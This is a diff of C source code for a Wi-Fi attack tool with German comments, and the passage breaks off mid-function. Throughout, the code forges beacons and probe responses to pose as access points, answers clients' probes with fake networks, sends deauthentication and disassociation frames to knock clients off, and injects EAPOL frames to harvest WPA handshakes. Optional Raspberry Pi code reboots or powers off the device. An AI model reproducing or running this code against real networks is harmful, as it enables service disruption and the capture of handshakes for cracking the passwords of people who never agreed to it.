@@ -22,7 +22,7 @@
 #include <linux/wireless.h>
 
 
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 #include <wiringPi.h>
 #undef TRUE
 #undef FALSE
@@ -33,38 +33,59 @@
 /*===========================================================================*/
 /* Definitionen */
 
-
-#define NEWENTRY -1
-
-#define MACLISTESIZEMAX 512
-#define ESSIDLISTSIZEMAX 512
-#define HIDDENLISTSIZEMAX 512
+#define APLISTESIZEMAX 1024
+#define STALISTESIZEMAX 1024
 
 #define SENDPACKETSIZEMAX 0x1ff
 
-#define PKART_BEACON		0b000000001
-#define PKART_PROBE_REQ		0b000000010
-#define PKART_DIR_PROBE_REQ	0b000000100
-#define PKART_PROBE_RESP	0b000001000
-#define PKART_ASSOC_REQ		0b000010000
-#define PKART_REASSOC_REQ	0b000100000
-#define PKART_HIDDENESSID	0b001000000
 
+struct aplist
+{
+ adr_t		addr_ap;
+ uint8_t	essid_len;
+ uint8_t	essid[32];
+};
+typedef struct aplist apl_t;
+#define	APL_SIZE (sizeof(apl_t))
+
+
+struct stalist
+{
+ adr_t		addr_ap;
+ adr_t		addr_sta;
+ int		deauthcount;
+ uint8_t	essid_len;
+ uint8_t	essid[32];
+};
+typedef struct stalist stal_t;
+#define	STAL_SIZE (sizeof(stal_t))
+
+/*===========================================================================*/
+/* globale variablen */
+
+pcap_t *pcapin = NULL;
+pcap_dumper_t *pcapout = NULL;
+uint8_t channel = 1;
+uint16_t mysequencenr = 1;
+int deauthmax = 2;
+
+apl_t *apliste = NULL; 
+stal_t *staliste = NULL; 
+
+adr_t myaddr;
+int myoui = 0;
+int myap = 0;
+
+
+char *interfacename = NULL;
 
 /*===========================================================================*/
 /* Konstante */
 
-const uint8_t hdradiotap[] =
+const uint8_t mac_null[] =
 {
- 0x00, 0x00, // <-- radiotap version
- 0x0c, 0x00, // <- radiotap header length
- 0x04, 0x80, 0x00, 0x00, // <-- bitmap
- 0x02, // <-- rate
- 0x00, // <-- padding for natural alignment
- 0x18, 0x00, // <-- TX flags
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
-#define HDRRT_SIZE sizeof(hdradiotap)
-
 
 const uint8_t broadcast[] =
 {
@@ -88,6 +109,16 @@ const int myvendor[] =
 };
 #define MYVENDOR_SIZE sizeof(myvendor)
 
+const uint8_t hdradiotap[] =
+{
+ 0x00, 0x00, // <-- radiotap version
+ 0x0c, 0x00, // <- radiotap header length
+ 0x04, 0x80, 0x00, 0x00, // <-- bitmap
+ 0x02, // <-- rate
+ 0x00, // <-- padding for natural alignment
+ 0x18, 0x00, // <-- TX flags
+};
+#define HDRRT_SIZE sizeof(hdradiotap)
 
 
 /* Fritzbox 3272 Beacon */
@@ -135,7 +166,6 @@ uint8_t proberesponsefb3272[] =
 };
 #define FB3272PROBERESPONSE_SIZE sizeof(proberesponsefb3272)
 
-
 uint8_t authenticationframe[] =
 {
 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
@@ -168,29 +198,10 @@ const uint8_t associationresponse[] =
 0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
 };
 #define ASSOCRESP_SIZE sizeof(associationresponse)
-
-/*===========================================================================*/
-/* globale variablen */
-
-pcap_t *pcapin = NULL;
-pcap_dumper_t *pcapout = NULL;
-
-macl_t *netlist = NULL; 
-adr_t myaddr;
-
-int resttime = 1;
-int deauthmax = 2;
-int disassocmax = 2;
-int disassochs2max = 2;
-int disassochs4max = 2;
-int myoui = 0;
-int myap = 0;
-uint16_t mysequencenr = 1;
-uint8_t verbose = FALSE;
-
 /*===========================================================================*/
 int initgloballists()
 {
+int c;
 myap = rand() & 0xffffff;
 if(myoui == 0)
 	myoui = myvendor[rand() % ((MYVENDOR_SIZE / sizeof(int))-1)];
@@ -200,86 +211,40 @@ myaddr.addr[2] = myoui & 0xff;
 myaddr.addr[1] = (myoui >> 8) & 0xff;
 myaddr.addr[0] = (myoui >> 16) & 0xff;
 
-if((netlist = malloc(MACLISTESIZEMAX * MACL_SIZE)) == NULL)
+if((apliste = malloc(APLISTESIZEMAX * APL_SIZE)) == NULL)
 	return FALSE;
-memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
+memset(apliste, 0, APLISTESIZEMAX * APL_SIZE);
 
-if(verbose == TRUE)
-	printf("start mac: %06x%06x\n", myoui, myap);
+if((staliste = malloc(STALISTESIZEMAX * STAL_SIZE)) == NULL)
+	return FALSE;
+memset(staliste, 0, STALISTESIZEMAX * STAL_SIZE);
+
+for(c = 0; c < STALISTESIZEMAX; c++)
+	staliste->deauthcount = deauthmax;
+
 
 return TRUE;
 }
 /*===========================================================================*/
-void printhex(const uint8_t *buffer, int size, int flag)
+void printaddr(const uint8_t *macaddr1, const uint8_t *macaddr2, int destflag)
 {
-int c, d;
-d = 0;
-for (c = 0; c < size; c++)
-	{
-	fprintf(stdout, "%02x", buffer[c]);
-	d++;
-	if((d == 32) && (size > 32))
-		{
-		fprintf(stdout,"\n                 ");
-		d = 0;
-		}
-	}
-if(flag == TRUE)
-	fprintf(stdout,"\n");
-else
-	fprintf(stdout," ");
-
-return;
-}
-/*===========================================================================*/
-void statusausgabe()
-{
-macl_t *zeiger =netlist;
 int c;
 
-char essidbuffer[36];
+fprintf(stdout, "%02d ", channel);
 
-if(verbose == TRUE)
-	{
-	printf("\nHostlist:\n");
-	for(c = 0; c < MACLISTESIZEMAX; c++)
-		{
-		if(zeiger->pkart == 0)
-			break;
-		memset(essidbuffer, 0, 36);
-		memcpy(essidbuffer, zeiger->essid, zeiger->essid_len);
-		printhex(zeiger->addr_ap.addr, 6, FALSE);
-		printf(" --> ");
-		printhex(zeiger->addr_sta.addr, 6, FALSE);
-		printf(" %s\n", essidbuffer);
-		zeiger++;
-		}
-	printf("\n");
-	}
-return;
-}
-/*===========================================================================*/
-void sigalarm(int signum)
-{
-if(signum == SIGALRM)
-	{
-	pcap_breakloop(pcapin);
-	alarm(5);
-	}
-return;
-}
-/*===========================================================================*/
-void programmende(int signum)
-{
-if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
-	{
-	pcap_dump_flush(pcapout);
-	pcap_dump_close(pcapout);
-	pcap_close(pcapin);
-	printf("program terminated...\n");
-	statusausgabe();
-	exit (EXIT_SUCCESS);
-	}
+for (c = 0; c < 6; c++)
+	fprintf(stdout, "%02x", macaddr1[c]);
+
+if(destflag == TRUE)
+	fprintf(stdout, " <- ");
+else
+	fprintf(stdout, " -> ");
+
+for (c = 0; c < 6; c++)
+	fprintf(stdout, "%02x", macaddr2[c]);
+
+fprintf(stdout, " ");
+
 return;
 }
 /*===========================================================================*/
@@ -292,7 +257,6 @@ beacon_t beacontsframe;
 essid_t essidframe;
 
 uint8_t sendpacket[SENDPACKETSIZEMAX];
-
 
 memset(&grundframe, 0, MAC_SIZE_NORM);
 grundframe.type = MAC_TYPE_MGMT;
@@ -323,9 +287,10 @@ sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len
 pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272BEACON_SIZE);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
+
 	fprintf(stderr, "error while sending beacon %s \n", pcap_geterr(pcapin));
 	}
 mysequencenr++;
@@ -373,7 +338,7 @@ sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len
 pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272PROBERESPONSE_SIZE);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending probe response %s \n", pcap_geterr(pcapin));
@@ -381,33 +346,6 @@ if(pcapstatus == -1)
 mysequencenr++;
 if(mysequencenr > 9999)
 	mysequencenr = 1;
-return;
-}
-/*===========================================================================*/
-void sendacknowledgement(uint8_t *macaddr1)
-{
-mac_t grundframe;
-int pcapstatus;
-
-uint8_t sendpacket[SENDPACKETSIZEMAX];
-
-memset(&grundframe, 0, MAC_SIZE_NORM);
-grundframe.type = MAC_TYPE_CTRL;
-grundframe.subtype = MAC_ST_ACK;
-grundframe.duration = 0;
-memcpy(grundframe.addr1.addr, macaddr1, 6);
-
-memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
-memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_ACK);
-
-pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_ACK);
-if(pcapstatus == -1)
-	{
-#ifdef RASPBERRY
-	system("reboot");
-#endif
-	fprintf(stderr, "error while sending acknowledgement %s \n", pcap_geterr(pcapin));
-	}
 return;
 }
 /*===========================================================================*/
@@ -435,7 +373,7 @@ pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENT
 
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending authentication %s \n", pcap_geterr(pcapin));
@@ -443,6 +381,33 @@ if(pcapstatus == -1)
 mysequencenr++;
 if(mysequencenr > 9999)
 	mysequencenr = 1;
+return;
+}
+/*===========================================================================*/
+void sendacknowledgement(uint8_t *macaddr1)
+{
+mac_t grundframe;
+int pcapstatus;
+
+uint8_t sendpacket[SENDPACKETSIZEMAX];
+
+memset(&grundframe, 0, MAC_SIZE_NORM);
+grundframe.type = MAC_TYPE_CTRL;
+grundframe.subtype = MAC_ST_ACK;
+grundframe.duration = 0;
+memcpy(grundframe.addr1.addr, macaddr1, 6);
+
+memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
+memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_ACK);
+
+pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_ACK);
+if(pcapstatus == -1)
+	{
+#ifdef DOGPIOSUPPORT
+	system("reboot");
+#endif
+	fprintf(stderr, "error while sending acknowledgement %s \n", pcap_geterr(pcapin));
+	}
 return;
 }
 /*===========================================================================*/
@@ -479,7 +444,7 @@ memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE, &association
 pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE +ASSOCRESP_SIZE);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending associationresponce %s \n", pcap_geterr(pcapin));
@@ -521,63 +486,11 @@ memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE, &anonce, ANONCE_SIZE);
 pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE +ANONCE_SIZE);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending key 1 %s \n", pcap_geterr(pcapin));
 	}
-grundframe.retry = 1;
-memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
-memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
-memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &qosframe, QOS_SIZE);
-memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE, &anonce, ANONCE_SIZE);
-
-pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE +ANONCE_SIZE);
-if(pcapstatus == -1)
-	{
-#ifdef RASPBERRY
-	system("reboot");
-#endif
-	fprintf(stderr, "error while retry sending key 1 %s \n", pcap_geterr(pcapin));
-	}
-return;
-}
-/*===========================================================================*/
-void sendactionchannelswitch(uint8_t *macaddr1, uint8_t *macaddr2)
-{
-int pcapstatus;
-mac_t grundframe;
-uint8_t sendpacket[SENDPACKETSIZEMAX];
-
-const uint8_t channelswitch[] =
-{
-0x00, 0x04, 0x25, 0x03, 0x00, 0x0c, 0x00
-};
-#define CHANNELSWITCH_SIZE sizeof(channelswitch)
-
-memset(&grundframe, 0, MAC_SIZE_NORM);
-grundframe.type = MAC_TYPE_MGMT;
-grundframe.subtype = MAC_ST_ACTION;
-grundframe.duration = 0x013a;
-memcpy(grundframe.addr1.addr, macaddr1, 6);
-memcpy(grundframe.addr2.addr, macaddr2, 6);
-memcpy(grundframe.addr3.addr, macaddr2, 6);
-grundframe.sequence = htole16(mysequencenr++ << 4);
-memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
-memcpy(sendpacket + HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
-memcpy(sendpacket + HDRRT_SIZE  +MAC_SIZE_NORM, &channelswitch, CHANNELSWITCH_SIZE);
-
-pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_NORM +CHANNELSWITCH_SIZE);
-if(pcapstatus == -1)
-	{
-#ifdef RASPBERRY
-	system("reboot");
-#endif
-	fprintf(stderr, "error while sending action channelswitch announcement %s \n", pcap_geterr(pcapin));
-	}
-mysequencenr++;
-if(mysequencenr > 9999)
-	mysequencenr = 1;
 return;
 }
 /*===========================================================================*/
@@ -605,7 +518,7 @@ sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +1] = 0;
 pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending deauthentication %s \n", pcap_geterr(pcapin));
@@ -617,7 +530,7 @@ memcpy(sendpacket +sizeof(hdradiotap), &grundframe, MAC_SIZE_NORM);
 pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
 if(pcapstatus == -1)
 	{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 	system("reboot");
 #endif
 	fprintf(stderr, "error while sending retry deauthentication %s \n", pcap_geterr(pcapin));
@@ -628,381 +541,150 @@ if(mysequencenr > 9999)
 return ;
 }
 /*===========================================================================*/
-int handlehiddenessid(uint8_t *mac_sta, uint8_t *mac_ap)
-{
-macl_t *zeiger;
-int c;
 
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if(memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0)
-		{
-		if(zeiger->deauthcount < deauthmax)
-			{
-			zeiger->deauthcount += 1;
-			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, zeiger->addr_sta.addr, zeiger->addr_ap.addr);
-			}
-
-		if((zeiger->pkart & PKART_HIDDENESSID) == PKART_HIDDENESSID)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_HIDDENESSID;
-			return NEWENTRY;
-			}
-		}
-	zeiger++;
-	}
-
-zeiger->pkart = PKART_HIDDENESSID;
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-zeiger->essid_len = 0;
-memset(zeiger->essid, 0, 32);
-if(zeiger->deauthcount < deauthmax)
-	{
-	zeiger->deauthcount += 1;
-	senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, zeiger->addr_sta.addr, zeiger->addr_ap.addr);
-	}
-return NEWENTRY;
-}
 /*===========================================================================*/
-int handlebeacon(uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
+#ifdef DOSTATUS
+unsigned long long int getreplaycount(eap_t *eap)
 {
-macl_t *zeiger;
-int c;
+unsigned long long int replaycount = 0;
 
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		if(zeiger->deauthcount < deauthmax)
-			{
-			zeiger->deauthcount += 1;
-			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, zeiger->addr_sta.addr, zeiger->addr_ap.addr);
-			}
-
-		if((zeiger->pkart & PKART_BEACON) == PKART_BEACON)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_BEACON;
-			return NEWENTRY;
-			}
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_BEACON;
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-if(zeiger->deauthcount < deauthmax)
-	{
-	zeiger->deauthcount += 1;
-	senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, zeiger->addr_sta.addr, zeiger->addr_ap.addr);
-	}
-return NEWENTRY;
+replaycount = be64toh(eap->replaycount);
+return replaycount;
 }
+#endif
 /*===========================================================================*/
-int handleproberequest(uint8_t channel, uint8_t *mac_sta, uint8_t essid_len, uint8_t **essidname)
+uint8_t geteapkey(eap_t *eap)
 {
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		sendproberesponse(channel, mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
-		sendbeacon(channel, zeiger->addr_ap.addr, essid_len, essidname);
-		return TRUE;
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_PROBE_REQ;
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-
-myaddr.addr[5] = myap & 0xff;
-myaddr.addr[4] = (myap >> 8) & 0xff;
-myaddr.addr[3] = (myap >> 16) & 0xff;
-myap++;
-memcpy(zeiger->addr_ap.addr, &myaddr, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-sendproberesponse(channel, mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
-sendbeacon(channel, zeiger->addr_ap.addr, essid_len, essidname);
-return NEWENTRY;
-}
-/*===========================================================================*/
-int handledirectproberequest(uint8_t channel, uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
-{
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		sendproberesponse(channel, mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
-		sendbeacon(channel, zeiger->addr_ap.addr, essid_len, essidname);
-		if((zeiger->pkart & PKART_DIR_PROBE_REQ) == PKART_DIR_PROBE_REQ)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_DIR_PROBE_REQ;
-			return NEWENTRY;
-			}
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_DIR_PROBE_REQ;
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-sendproberesponse(channel, mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
-sendbeacon(channel, zeiger->addr_ap.addr, essid_len, essidname);
-return NEWENTRY;
-}
-/*===========================================================================*/
-int handleproberesponse(uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
-{
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		if((zeiger->pkart & PKART_PROBE_RESP) == PKART_PROBE_RESP)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_PROBE_RESP;
-			return NEWENTRY;
-			}
-		}
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == 0))
-		{
-		memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-		zeiger->essid_len = essid_len;
-		memcpy(zeiger->essid, essidname, essid_len);
-		zeiger->pkart |= PKART_PROBE_RESP;
-		return NEWENTRY;
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_PROBE_RESP;
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-return NEWENTRY;
-}
-/*===========================================================================*/
-int handlereassociationrequest(uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
-{
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		sendacknowledgement(mac_sta);
-		sendassociationresponse(MAC_ST_REASSOC_RESP, mac_sta, mac_ap);
-		if((zeiger->pkart & PKART_REASSOC_REQ) == PKART_REASSOC_REQ)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_REASSOC_REQ;
-			return NEWENTRY;
-			}
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_REASSOC_REQ;
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-sendacknowledgement(mac_sta);
-sendassociationresponse(MAC_ST_REASSOC_RESP, mac_sta, mac_ap);
-return NEWENTRY;
-}
-/*===========================================================================*/
-int handleassociationrequest(uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
-{
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(zeiger->pkart == 0)
-		break;
-
-	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
-		{
-		sendacknowledgement(mac_sta);
-		sendassociationresponse(MAC_ST_ASSOC_RESP, mac_sta, mac_ap);
-		if((zeiger->pkart & PKART_ASSOC_REQ) == PKART_ASSOC_REQ)
-			return TRUE;
-		else
-			{
-			zeiger->pkart |= PKART_ASSOC_REQ;
-			return NEWENTRY;
-			}
-		}
-	zeiger++;
-	}
-
-if(c == MACLISTESIZEMAX)
-	{
-	zeiger = netlist;
-	memset(netlist, 0, MACLISTESIZEMAX * MACL_SIZE);
-	}
-
-zeiger->pkart = PKART_ASSOC_REQ;
-memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-memcpy(zeiger->addr_ap.addr, mac_ap, 6);
-zeiger->essid_len = essid_len;
-memcpy(zeiger->essid, essidname, essid_len);
-sendacknowledgement(mac_sta);
-sendassociationresponse(MAC_ST_ASSOC_RESP, mac_sta, mac_ap);
-return NEWENTRY;
-}
-/*===========================================================================*/
-void handlenullpowersave(uint8_t *mac_ap, uint8_t *mac_sta)
-{
-macl_t *zeiger;
-int c;
-
-zeiger = netlist;
-for(c = 0; c < MACLISTESIZEMAX; c++)
-	{
-	if(memcmp(zeiger->addr_ap.addr, mac_ap, 6) == 0)
-		{
-		memcpy(zeiger->addr_sta.addr, mac_sta, 6);
-		if(zeiger->disassoccount < disassocmax)
-			{
-			zeiger->disassoccount += 1;
-			senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY, mac_sta, mac_ap);
-			}
-		}
-	zeiger++;
-	}
-return;
-}
-/*===========================================================================*/
-void handlehandshake(uint8_t *mac1, uint8_t *mac2, eap_t *eap)
-{
-macl_t *zeiger;
-uint16_t keyinfo = 0;
-int c;
+uint16_t keyinfo;
+int eapkey = 0;
 
 keyinfo = (((eap->keyinfo & 0xff) << 8) | (eap->keyinfo >> 8));
-if(!(keyinfo & WPA_KEY_INFO_ACK))
+if (keyinfo & WPA_KEY_INFO_ACK)
 	{
-	if (keyinfo & WPA_KEY_INFO_SECURE)
+	if(keyinfo & WPA_KEY_INFO_INSTALL)
+		{
+		/* handshake 3 */
+		eapkey = 3;
+		}
+	else
+		{
+		/* handshake 1 */
+		eapkey = 1;
+		}
+	}
+else
+	{
+	if(keyinfo & WPA_KEY_INFO_SECURE)
 		{
 		/* handshake 4 */
-		zeiger = netlist;
-		for(c = 0; c < MACLISTESIZEMAX; c++)
-			{
-			if(memcmp(zeiger->addr_ap.addr, mac1, 6) == 0)
-				{
-				if(zeiger->disassochs4count < disassochs4max)
-					{
-					zeiger->disassochs4count += 1;
-					senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, mac2, mac1);
-					}
-				}
-			zeiger++;
-			}
+		eapkey = 4;
 		}
 	else
 		{
 		/* handshake 2 */
-		zeiger = netlist;
-		for(c = 0; c < MACLISTESIZEMAX; c++)
-			{
-			if(memcmp(zeiger->addr_ap.addr, mac1, 6) == 0)
-				{
-				if(zeiger->disassochs4count < disassochs4max)
-					{
-					zeiger->disassochs4count += 1;
-					senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, mac2, mac1);
-					}
-				}
-			zeiger++;
-			}
+		eapkey = 2;
 		}
+	}
+return eapkey;
+}
+/*===========================================================================*/
+int handlestaframes(uint8_t *mac_ap, uint8_t *mac_sta, uint8_t essid_len, uint8_t **essidname)
+{
+stal_t *zeiger;
+int c;
+
+zeiger = staliste;
+for(c = 0; c < STALISTESIZEMAX; c++)
+	{
+	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (memcmp(mac_sta, zeiger->addr_sta.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
+		{
+		return TRUE;
+		}
+	if(memcmp(&mac_null, zeiger->addr_sta.addr, 6) == 0)
+		break;
+	zeiger++;
+	}
+
+if(c >= STALISTESIZEMAX)
+	{
+	zeiger = staliste;
+	memset(staliste, 0, STALISTESIZEMAX * STAL_SIZE);
+	}
+
+memcpy(zeiger->addr_ap.addr, mac_ap, 6);
+memcpy(zeiger->addr_sta.addr, mac_sta, 6);
+zeiger->essid_len = essid_len;
+memcpy(zeiger->essid, essidname, essid_len);
+return FALSE;
+}
+/*===========================================================================*/
+int handleapframes(uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
+{
+apl_t *zeiger;
+int c;
+
+zeiger = apliste;
+for(c = 0; c < APLISTESIZEMAX; c++)
+	{
+	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
+		{
+		return TRUE;
+		}
+	if(memcmp(&mac_null, zeiger->addr_ap.addr, 6) == 0)
+		break;
+	zeiger++;
+	}
+
+if(c >= APLISTESIZEMAX)
+	{
+	zeiger = apliste;
+	memset(apliste, 0, APLISTESIZEMAX * APL_SIZE);
+	}
+
+memcpy(zeiger->addr_ap.addr, mac_ap, 6);
+zeiger->essid_len = essid_len;
+memcpy(zeiger->essid, essidname, essid_len);
+return FALSE;
+}
+/*===========================================================================*/
+void sigalarm(int signum)
+{
+if(signum == SIGALRM)
+	{
+#ifdef DOGPIOSUPPORT
+	digitalWrite(0, HIGH);
+	delay (25);
+	digitalWrite(0, LOW);
+	delay (25);
+	if(digitalRead(7) == 1)
+		{
+		digitalWrite(0, HIGH);
+		pcap_dump_close(pcapout);
+		pcap_close(pcapin);
+		system("poweroff");
+		}
+#endif
+
